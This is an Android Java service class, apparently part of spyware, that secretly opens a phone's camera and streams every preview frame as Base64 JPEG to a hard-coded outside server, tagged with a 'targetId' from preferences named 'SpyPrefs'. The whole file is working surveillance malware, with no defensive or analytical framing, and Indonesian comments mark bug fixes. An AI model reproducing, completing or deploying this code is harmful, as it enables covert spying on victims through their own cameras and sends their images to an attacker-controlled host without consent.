package com.nullx.pp;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class CameraStreamService extends Service implements Camera.PreviewCallback {
    private static final String TAG = "CRPT.CameraStream";
    private static final String SERVER_URL = "http://papa.queen-official.com:2949/api/post-response/";
    private Camera camera;
    private boolean isStreaming = false;
    private String cameraSide = "back";
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            cameraSide = intent.getStringExtra("side") != null ? intent.getStringExtra("side") : "back";
        }
        startStreaming();
        return START_STICKY;
    }
    
    private void startStreaming() {
        isStreaming = true;
        int cameraId = cameraSide.equals("front") ? Camera.CameraInfo.CAMERA_FACING_FRONT : Camera.CameraInfo.CAMERA_FACING_BACK;
        
        try {
            camera = Camera.open(cameraId);
            Camera.Parameters params = camera.getParameters();
            params.setPreviewFormat(ImageFormat.NV21);
            camera.setParameters(params);
            camera.setPreviewCallback(this);
            camera.startPreview();
            Log.d(TAG, "Camera streaming started");
        } catch (Exception e) {
            Log.e(TAG, "Error starting camera: " + e.getMessage());
            isStreaming = false;
        }
    }
    
    @Override
    public void onPreviewFrame(byte[] data, Camera camera) {
        if (!isStreaming) return;
        
        new Thread(() -> {
            try {
                Camera.Parameters params = camera.getParameters();
                int width = params.getPreviewSize().width;
                int height = params.getPreviewSize().height;
                
                YuvImage yuvImage = new YuvImage(data, params.getPreviewFormat(), width, height, null);
                ByteArrayOutputStream out = new ByteArrayOutputStream();
                yuvImage.compressToJpeg(new Rect(0, 0, width, height), 30, out);
                
                String base64Frame = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);
                sendFrameToServer(base64Frame);
            } catch (Exception e) {
                Log.e(TAG, "Error processing frame: " + e.getMessage());
            }
        }).start();
    }
    
    private void sendFrameToServer(String base64Frame) {
        try {
            // Memanggil method yang sudah diperbaiki di bawah
            String targetId = getSharedPreferences("SpyPrefs", MODE_PRIVATE).getString("targetId", "unknown");
            URL url = new URL(SERVER_URL + targetId);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            
            JSONObject payload = new JSONObject();
            payload.put("cmd", "live_camera_frame");
            payload.put("data", base64Frame);
            
            try (OutputStream os = conn.getOutputStream()) {
                os.write(payload.toString().getBytes());
            }
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Error sending frame: " + e.getMessage());
        }
    }
    
    private void stopStreaming() {
        isStreaming = false;
        if (camera != null) {
            camera.setPreviewCallback(null);
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }
    
    @Override
    public void onDestroy() {
        stopStreaming();
        super.onDestroy();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    // Perbaikan: Method dibuat public dan memanggil super agar tidak infinite loop
    @Override
    public SharedPreferences getSharedPreferences(String name, int mode) {
        return super.getSharedPreferences(name, mode);
    }
}